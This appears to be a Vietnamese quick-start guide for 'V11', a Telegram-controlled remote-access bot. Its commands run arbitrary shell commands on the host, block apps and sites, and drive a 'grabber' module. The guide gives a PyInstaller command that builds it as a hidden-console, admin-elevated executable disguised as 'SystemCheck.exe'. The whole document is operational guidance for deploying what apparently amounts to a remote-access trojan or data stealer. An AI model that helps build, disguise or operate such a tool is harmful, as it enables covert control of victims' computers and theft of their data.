# 🚀 QUICK START - V11

> **Developer:** TsByin  
> **Version:** 11.0

---

## 5 Bước Nhanh

### 1️⃣ Cài Đặt Thư Viện

```bash
pip install -r requirements.txt
```

### 2️⃣ Cấu Hình .env

Tạo file `.env` với nội dung:

```env
API_TOKEN=YOUR_TELEGRAM_TOKEN_HERE
ADMIN_ID=YOUR_ADMIN_ID_HERE
```

**Lưu file.**

### 3️⃣ Kiểm Tra Config

```bash
python -c "from config import API_TOKEN, ADMIN_ID; print('✅ Config OK')"
```

### 4️⃣ Chạy Bot

```bash
python V11.py
```

**Thành công sẽ thấy:**
```
🟢 Bot Started. ID: YOUR_ID
🟢 SYSTEM ONLINE | Host: [tên máy]
```

### 5️⃣ Test Telegram

Gửi `/start` hoặc `/menu` → Bot sẽ hiển thị menu

---

## Lệnh Cơ Bản (đã hỗ trợ nhiều mục)

| Lệnh | Mô Tả |
|------|-------|
| `/start` | Mở menu điều khiển |
| `/help` | Xem hướng dẫn |
| `/cmd <lệnh>` | Chạy lệnh CMD |
| `/msg <nội dung>` | Hiển thị thông báo |
| `/say <nội dung>` | Phát giọng nói |
| `/block app a.exe b.exe` | Chặn nhiều app |
| `/block site x.com y.com` | Chặn nhiều website |
| `/unblock app a.exe b.exe` | Gỡ nhiều app |
| `/unblock site x.com` | Gỡ nhiều website |

---

## Build EXE (Tùy Chọn)

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V11.py
```

Output: `dist/SystemCheck.exe`

**Xem:** `BUILD_EXE.md` để chi tiết

---

## Troubleshooting

**Bot không online?**
- Kiểm tra .env có API_TOKEN hợp lệ
- Chạy lại: `python V11.py`

**Import error?**
- Reinstall: `pip install -r requirements.txt`

**Không nhận lệnh?**
- Kiểm tra ADMIN_ID đúng với ID Telegram
- Gửi `/start` lại

---

**Tài liệu đầy đủ:** `README.md`  
**Kiến trúc chi tiết:** `ARCHITECTURE.md`

---

## **CÓ GÌ THAY ĐỔI?**

| Tính Năng | Cũ | Mới |
|-----------|-----|-----|
| **Token** | Hardcode | .env ✅ |
| **Logging** | silent | chi tiết ✅ |
| **Grabber** | 1 worker | 4 worker ✅ |
| **Tốc độ** | ~20s | ~8s ✅ |
| **Modular** | 1 file | 7 file ✅ |

---

## **STRUCTURE MỚI**

```
V11/
├── .env (NEW)
├── config.py (NEW)
├── utils.py (NEW)
├── grabber.py (NEW - optimized)
├── media.py (NEW)
├── monitor.py (NEW)
├── V11.py (Main bot - 867 lines)
├── requirements.txt (UPDATED)
└── OPTIMIZATION_GUIDE.md (NEW)
```

---

## **TROUBLESHOOT NHANH**

**❌ ModuleNotFoundError**
```powershell
pip install -r requirements.txt --force-reinstall
```

**❌ KeyError: 'API_TOKEN'**

PowerShell:
```powershell
# Check .env exists
Test-Path .env
# Show contents
Get-Content .env
```

CMD:
```cmd
:: Check .env exists
if exist .env (echo .env exists) else (echo .env missing)
:: Show contents
type .env
```

Unix / Git Bash:
```bash
# Check .env exists
[ -f .env ] && echo ".env exists" || echo ".env missing"
# Show contents
cat .env
```

**❌ Bot không connect**
```powershell
# Verify token
python -c "from config import API_TOKEN; print(API_TOKEN[:20] + '...')"
```

---

## **NEXT STEPS**

1. ✅ Cài .env + modules
2. ✅ Chạy V11.py
3. ✅ Test lệnh `/menu` trên Telegram
4. 📝 Xem `BUILD_EXE.md` cho hướng dẫn build
5. 🔨 Build EXE:

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V11.py
```---

**🎉 XONG! Bot tối ưu đã sẵn sàng!**
